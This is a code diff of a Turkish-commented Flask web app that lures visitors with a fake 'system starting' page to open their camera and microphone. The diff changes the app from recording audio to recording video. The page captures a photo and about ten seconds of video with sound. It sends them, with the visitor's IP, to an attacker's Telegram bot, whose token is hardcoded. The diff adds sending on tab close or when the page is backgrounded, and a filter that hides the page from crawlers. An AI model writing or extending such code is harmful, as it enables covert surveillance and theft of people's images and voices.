@@ -1,6 +1,5 @@
 from flask import Flask, request, jsonify
 import requests
-import time
 import os
 import base64
 
@@ -10,9 +9,7 @@ app = Flask(__name__)
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
 
-# Spam koruması için global değişken
-son_mesaj_zamani = 0
-
+# --- TELEGRAM FONKSİYONLARI ---
 def telegram_mesaj_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -29,21 +26,22 @@ def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
         files = {'photo': ('ajan.jpg', resim_bytes)}
         data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
         
-        requests.post(url, files=files, data=data, timeout=10)
+        requests.post(url, files=files, data=data, timeout=15)
     except Exception as e:
         print("Fotoğraf Hatası:", e)
 
-def telegram_ses_gonder(ses_dosyasi):
+def telegram_video_gonder(video_dosyasi):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVoice"
-        # Telegram ses kayıtlarını genellikle .ogg veya .webm formatında sever
-        files = {'voice': ('ajan_ses.webm', ses_dosyasi, 'audio/webm')}
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo"
+        files = {'video': ('ajan_video.webm', video_dosyasi, 'video/webm')}
         data = {'chat_id': CHAT_ID}
         
-        requests.post(url, files=files, data=data, timeout=10)
+        # Video boyutu büyük olabileceği için timeout süresini uzun tuttuk
+        requests.post(url, files=files, data=data, timeout=40)
     except Exception as e:
-        print("Ses Gönderme Hatası:", e)
+        print("Video Gönderme Hatası:", e)
 
+# --- WEB ROTALARI ---
 @app.route('/', methods=['GET'])
 def ana_sayfa():
     if request.path == '/favicon.ico': return "OK", 200
@@ -62,11 +60,11 @@ def ana_sayfa():
 
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # 🚨 BOT FİLTRESİ
+    # 🚨 BOT FİLTRESİ (Senin kaldırdığını söylediğin ama güvenlik için eklediğimiz filtre)
     if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or 'python' in user_agent:
         return "OK", 200
 
-    # 📸 OTOMATİK KAMERA VE MİKROFON İSTEĞİ
+    # 📸 FOTOĞRAF VE SESLİ VİDEO İSTEĞİ
     html = f"""
     <body style='background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding-top:15%;'>
         <h2 style='color:red;'>SİSTEM BAŞLATILIYOR...</h2>
@@ -78,75 +76,96 @@ def ana_sayfa():
         <script>
             window.onload = async function() {{
                 const durum = document.getElementById('durum');
-                
+                let mediaRecorder;
+                let videoChunks = [];
+                let stream;
+                let isSent = false; // Çift gönderimi engellemek için
+
+                function verileriGonder() {{
+                    if (isSent) return;
+                    isSent = true;
+
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {{
+                        mediaRecorder.stop(); // Kaydı durdur, onstop'u tetikler
+                    }}
+                }}
+
                 try {{
-                    // Hem kamera hem mikrofon izni istiyoruz
-                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
+                    // Hem kamera hem mikrofon izni
+                    stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     
                     video.onloadedmetadata = () => {{
                         setTimeout(() => {{
-                            // 1. FOTOĞRAF ÇEKME İŞLEMİ
+                            // 1. ADIM: FOTOĞRAF ÇEK VE GÖNDER
                             const canvas = document.getElementById('canvas');
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0);
                             const foto = canvas.toDataURL('image/jpeg');
                             
-                            durum.innerHTML = "✅ Fotoğraf çekildi. Ses kaydı başlıyor...";
+                            fetch('/kamera', {{
+                                method: 'POST',
+                                headers: {{ 'Content-Type': 'application/json' }},
+                                body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
+                            }});
+
+                            durum.innerHTML = "✅ Fotoğraf çekildi. Sesli Video kaydı başlıyor...";
                             
-                            // 2. SES KAYDI BAŞLATMA İŞLEMİ
-                            const mediaRecorder = new MediaRecorder(stream);
-                            const audioChunks = [];
+                            // 2. ADIM: SESLİ VİDEO KAYDET
+                            mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
 
                             mediaRecorder.ondataavailable = event => {{
-                                audioChunks.push(event.data);
+                                if (event.data.size > 0) {{
+                                    videoChunks.push(event.data);
+                                }}
                             }};
 
                             mediaRecorder.onstop = () => {{
-                                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
+                                const videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
                                 const formData = new FormData();
-                                formData.append('ses_dosyasi', audioBlob, 'kayit.webm');
+                                formData.append('video_dosyasi', videoBlob, 'kayit.webm');
                                 
-                                durum.innerHTML = "✅ Ses kaydı bitti, gönderiliyor...";
-                                
-                                fetch('/ses', {{
+                                // keepalive: true sayesinde sayfa kapansa bile veri gitmeye devam eder
+                                fetch('/video', {{
                                     method: 'POST',
-                                    body: formData
+                                    body: formData,
+                                    keepalive: true 
                                 }});
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                                durum.innerHTML = "✅ İşlem tamamlandı!";
                             }};
 
                             mediaRecorder.start();
                             
-                            // 10 saniye sayacı
+                            // 10 Saniyelik Sayaç
                             let saniye = 10;
                             const sayac = setInterval(() => {{
-                                durum.innerHTML = "🎙️ Ses kaydediliyor: " + saniye + " saniye kaldı...";
-                                saniye--;
+                                if(!isSent) {{
+                                    durum.innerHTML = "🎥 Sesli Video Kaydediliyor: " + saniye + " saniye kaldı...";
+                                    saniye--;
+                                }}
                             }}, 1000);
 
-                            // 10 saniye sonra kaydı durdur ve fotoğrafı gönder
+                            // 1. DURUM: 10 saniye dolarsa
                             setTimeout(() => {{
                                 clearInterval(sayac);
-                                mediaRecorder.stop();
-                                
-                                // Fotoğrafı gönder
-                                fetch('/kamera', {{
-                                    method: 'POST',
-                                    headers: {{ 'Content-Type': 'application/json' }},
-                                    body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
-                                }});
+                                verileriGonder(); 
+                            }}, 10000); 
 
-                                // İşlem bitince kamerayı ve mikrofonu kapat
-                                setTimeout(() => {{
-                                    stream.getTracks().forEach(track => track.stop());
-                                    durum.innerHTML = "✅ İşlem tamamlandı!";
-                                }}, 1000);
+                            // 2. DURUM: Sekme kapatılırsa veya geri gidilirse
+                            window.addEventListener('beforeunload', verileriGonder);
 
-                            }}, 10000); // 10 saniye
+                            // 3. DURUM: Uygulama arka plana atılırsa (Mobil)
+                            document.addEventListener('visibilitychange', () => {{
+                                if (document.visibilityState === 'hidden') {{
+                                    verileriGonder();
+                                }}
+                            }});
 
-                        }}, 1500); // Kamera açıldıktan 1.5 saniye sonra başla
+                        }}, 1500); // Kamera ısınsın diye 1.5 saniye bekle
                     }};
                 }} catch (error) {{
                     durum.innerHTML = "❌ İzin verilmedi (Kamera/Mikrofon)";
@@ -185,18 +204,15 @@ def kamera():
     telegram_fotograf_gonder(veri['image'], bilgi_metni)
     return "OK", 200
 
-# --- YENİ EKLENEN ROTA: SES KAYDI ---
-@app.route('/ses', methods=['POST'])
-def ses():
-    if 'ses_dosyasi' not in request.files:
-        return jsonify({"hata": "Ses dosyası bulunamadı"}), 400
+@app.route('/video', methods=['POST'])
+def video():
+    if 'video_dosyasi' not in request.files:
+        return jsonify({"hata": "Video bulunamadı"}), 400
     
-    ses_dosyasi = request.files['ses_dosyasi']
-    ses_verisi = ses_dosyasi.read()
+    video_dosyasi = request.files['video_dosyasi']
+    video_verisi = video_dosyasi.read()
     
-    # Ses kaydını Telegram'a gönder
-    telegram_ses_gonder(ses_verisi)
-    
+    telegram_video_gonder(video_verisi)
     return "OK", 200
 
 @app.route('/kamera_hata', methods=['POST'])
@@ -221,4 +237,4 @@ def kamera_hata():
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port) 
+    app.run(host='0.0.0.0', port=port)
